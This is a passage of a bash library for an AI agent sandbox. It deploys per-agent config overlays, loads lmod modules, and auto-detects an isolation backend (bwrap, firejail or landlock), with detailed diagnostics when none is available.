    _ensure_writable_home_dirs

    # Deploy user-customizable agent files (agent.md, settings.json)
    # to ~/.config/agent-sandbox/agents/. Overwrites unmodified copies
    # on upgrade; preserves user edits.
    _deploy_agent_files

    local agent_name agent_dir overlay
    for agent_name in "${ENABLED_AGENTS[@]}"; do
        agent_dir="$agents_dir/$agent_name/"
        [[ -d "$agent_dir" ]] || continue
        overlay="$agent_dir/overlay.sh"
        [[ -f "$overlay" ]] || continue

        # Source + run the overlay in a subshell and marshal its staged
        # outputs back via stdout. Command substitution aborts the
        # surrounding `set -e` script if the subshell itself fails
        # (e.g. syntax error in overlay, agent_prepare_config errors out)
        # — sandbox start is aborted rather than silently missing config.
        local _agent_out
        _agent_out="$(
            _AGENT_ENV_EXPORTS=()
            _AGENT_SANDBOX_CONFIG_DIRS=()
            _AGENT_PROTECTED_FILES=()
            # shellcheck disable=SC1090
            source "$overlay"
            agent_prepare_config "$project_dir"
            printf 'ENV\t%s\n'  "${_AGENT_ENV_EXPORTS[@]:-}"
            printf 'DIR\t%s\n'  "${_AGENT_SANDBOX_CONFIG_DIRS[@]:-}"
            printf 'FILE\t%s\n' "${_AGENT_PROTECTED_FILES[@]:-}"
        )"

        # Parse tagged output back into the real arrays. Skip empty
        # values (printf with an empty array under :- emits one blank).
        local _tag _val
        while IFS=$'\t' read -r _tag _val; do
            [[ -n "$_val" ]] || continue
            case "$_tag" in
                ENV)  _AGENT_ENV_EXPORTS+=("$_val") ;;
                DIR)  _AGENT_SANDBOX_CONFIG_DIRS+=("$_val") ;;
                FILE) _AGENT_PROTECTED_FILES+=("$_val") ;;
            esac
        done <<< "$_agent_out"
    done
}

# ── Lmod module loading ─────────────────────────────────────────
#
# Load user-configured lmod modules before backend detection so that
# module-provided binaries (e.g., a newer bwrap) appear on PATH.

_load_sandbox_modules() {
    # Default to empty if not set (safe under set -u)
    SANDBOX_MODULES=("${SANDBOX_MODULES[@]+"${SANDBOX_MODULES[@]}"}")
    [[ ${#SANDBOX_MODULES[@]} -gt 0 ]] || return 0

    # Ensure the `module` shell function is available
    if ! type module &>/dev/null; then
        for _init in /etc/profile.d/lmod.sh \
                     /usr/share/lmod/lmod/init/bash \
                     /app/lmod/lmod/init/bash; do
            if [[ -f "$_init" ]]; then
                # shellcheck disable=SC1090
                source "$_init"
                break
            fi
        done
    fi

    if ! type module &>/dev/null; then
        echo "sandbox: warning: SANDBOX_MODULES set but 'module' command not available" >&2
        return 1
    fi

    for _mod in "${SANDBOX_MODULES[@]}"; do
        if ! module load "$_mod" 2>/dev/null; then
            echo "sandbox: warning: failed to load module '$_mod'" >&2
        fi
    done
}

# ── Backend detection ───────────────────────────────────────────

# SANDBOX_BACKEND can be set in sandbox.conf or environment.
# Values: auto (picks best available), bwrap, firejail, landlock
SANDBOX_BACKEND="${SANDBOX_BACKEND:-auto}"

detect_backend() {
    if [[ "$SANDBOX_BACKEND" != "auto" ]]; then
        # User explicitly requested a backend
        if [[ ! -f "$SANDBOX_DIR/backends/${SANDBOX_BACKEND}.sh" ]]; then
            echo "Error: Unknown backend '$SANDBOX_BACKEND'" >&2
            echo "  Available: bwrap, firejail, landlock" >&2
            exit 1
        fi
        # shellcheck disable=SC1090
        source "$SANDBOX_DIR/backends/${SANDBOX_BACKEND}.sh"
        if ! backend_available; then
            echo "Error: Requested backend '$SANDBOX_BACKEND' is not available on this system." >&2
            echo "  Host:   $(hostname 2>/dev/null || echo unknown)" >&2
            echo "  Kernel: $(uname -r 2>/dev/null || echo unknown)" >&2
            echo "  LSMs:   $(cat /sys/kernel/security/lsm 2>/dev/null || echo unknown)" >&2
            if [[ "$SANDBOX_BACKEND" == "bwrap" ]] && command -v bwrap &>/dev/null; then
                local _bv
                _bv=$(bwrap --version 2>/dev/null | grep -oP '\d+\.\d+\.\d+' || echo "unknown")
                echo "  bwrap:  $_bv (need ≥ 0.4.0 for --chmod, --unsetenv)" >&2
            fi
            exit 1
        fi
        return
    fi

    # Auto-detect: try bwrap first (mount namespace), then firejail (setuid),
    # then landlock (LSM — weakest isolation but works everywhere ≥ 5.13)
    # shellcheck disable=SC1090
    source "$SANDBOX_DIR/backends/bwrap.sh"
    if backend_available; then
        SANDBOX_BACKEND=bwrap
        return
    fi

    # shellcheck disable=SC1090
    source "$SANDBOX_DIR/backends/firejail.sh"
    if backend_available; then
        SANDBOX_BACKEND=firejail
        return
    fi

    # shellcheck disable=SC1090
    source "$SANDBOX_DIR/backends/landlock.sh"
    if backend_available; then
        SANDBOX_BACKEND=landlock
        return
    fi

    # Collect diagnostics for troubleshooting
    local _host _kernel _os _userns _lsm _bwrap_path _firejail_path
    _host="$(hostname 2>/dev/null || echo unknown)"
    _kernel="$(uname -r 2>/dev/null || echo unknown)"
    _os="$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME" || echo unknown)"
    _bwrap_path="$(command -v bwrap 2>/dev/null || echo "not found")"
    _firejail_path="$(command -v firejail 2>/dev/null || echo "not found")"
    _userns="$(cat /proc/sys/user/max_user_namespaces 2>/dev/null || echo "unknown")"
    _lsm="$(cat /sys/kernel/security/lsm 2>/dev/null || echo "unknown")"

    echo "Error: No sandbox backend available." >&2
    echo "" >&2
    echo "  Host:       $_host" >&2
    echo "  OS:         $_os" >&2
    echo "  Kernel:     $_kernel" >&2
    echo "  LSMs:       $_lsm" >&2
    echo "  bwrap:      $_bwrap_path" >&2
    echo "  firejail:   $_firejail_path" >&2
    echo "  userns max: $_userns" >&2
    echo "" >&2
    echo "  Tried:" >&2
    echo "    bwrap    — $(if [[ "$_bwrap_path" == "not found" ]]; then echo "binary not found"; elif echo "$_lsm" | grep -q apparmor && sysctl -n kernel.apparmor_restrict_unprivileged_userns 2>/dev/null | grep -q 1; then echo "blocked by AppArmor userns restriction"; else echo "failed (check user namespace support)"; fi)" >&2
    echo "    firejail — $(if [[ "$_firejail_path" == "not found" ]]; then echo "binary not found"; else echo "failed (check setuid bit or seccomp support)"; fi)" >&2
    echo "    landlock — $(
        local _kmaj _kmin
        _kmaj="$(uname -r | cut -d. -f1)"
        _kmin="$(uname -r | cut -d. -f2)"
        if [[ "$_kmaj" -lt 5 ]] 2>/dev/null || { [[ "$_kmaj" -eq 5 ]] && [[ "$_kmin" -lt 13 ]]; } 2>/dev/null; then
            echo "kernel too old (need ≥ 5.13)"
        elif ! echo "$_lsm" | grep -q landlock; then
            echo "not in active LSM list"
        else
            echo "failed (check CONFIG_SECURITY_LANDLOCK)"
        fi
    )" >&2
    echo "" >&2
    echo "  Fix (in order of recommendation):" >&2
    echo "    Install bubblewrap:  sudo apt install bubblewrap" >&2
    echo "                         brew install bubblewrap  (user-local, no root)" >&2
    echo "    Install firejail:    sudo apt install firejail" >&2
    echo "    Or ensure kernel ≥ 5.13 with Landlock enabled." >&2
    exit 1
}

# ── Legacy compatibility ────────────────────────────────────────
# These functions are kept so that existing code that sources sandbox-lib.sh
# and calls build_bwrap_args() directly (e.g., srun-sandbox.sh) still works.
# New code should use detect_backend + backend_prepare + backend_exec.

# Detect on source if not already done (for scripts that source sandbox-lib.sh
# and immediately call build_bwrap_args).
_BACKEND_DETECTED=false

build_bwrap_args() {
    if [[ "$_BACKEND_DETECTED" == false ]]; then
        _load_sandbox_modules
        detect_backend
        _BACKEND_DETECTED=true
    fi
    _apply_agent_profiles
    prepare_agent_configs "$1"
    backend_prepare "$1"
}

# Expose BWRAP for legacy callers (resolved by bwrap backend)
# This is a no-op if landlock backend is loaded.
